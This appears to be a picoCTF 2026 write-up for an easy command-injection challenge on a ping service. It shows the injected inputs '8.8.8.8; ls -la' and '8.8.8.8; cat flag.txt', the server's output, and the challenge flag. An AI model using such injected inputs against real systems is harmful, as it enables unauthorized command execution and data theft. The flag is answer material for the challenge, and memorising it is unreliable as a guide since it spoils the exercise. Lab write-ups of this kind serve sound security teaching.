---
created at: 2026-04-29 || 16:51
category: General Skills
tags:
  - picoCTF_2026
difficulty: Easy
---
## Task description
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
## Solution
After trying some payloads on this server, i understood that server uses plain bash
So, we can execute any bash commands
For example - `8.8.8.8; ls -la` to check what directory contains:
```bash
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls -la    
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.  
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.59 ms  
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.51 ms  
  
--- 8.8.8.8 ping statistics ---  
2 packets transmitted, 2 received, 0% packet loss, time 1002ms  
rtt min/avg/max/mdev = 9.511/9.552/9.593/0.041 ms  
total 20  
drwxr-x--- 1 ctf-player ctf-player   23 Mar  7 11:53 .  
drwxr-xr-x 1 root       root         24 Mar  7 11:53 ..  
-rw-r--r-- 1 ctf-player ctf-player  220 Jan  6  2022 .bash_logout  
-rw-r--r-- 1 ctf-player ctf-player 3771 Jan  6  2022 .bashrc  
-rw-r--r-- 1 ctf-player ctf-player  807 Jan  6  2022 .profile  
-r-------- 1 ctf-player ctf-player   49 Mar  6 20:19 flag.txt  
-r-x------ 1 ctf-player ctf-player  149 Mar  7 11:53 script.sh
```

Then, lets read `flag.txt` flag (we need to run command again, cause shell brakes):
```bash
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat flag.t  
xt  
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.  
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.54 ms  
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.48 ms  
  
--- 8.8.8.8 ping statistics ---  
2 packets transmitted, 2 received, 0% packet loss, time 1002ms  
rtt min/avg/max/mdev = 9.476/9.507/9.539/0.031 ms  
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}
```
## Flag
`picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_252214ae}`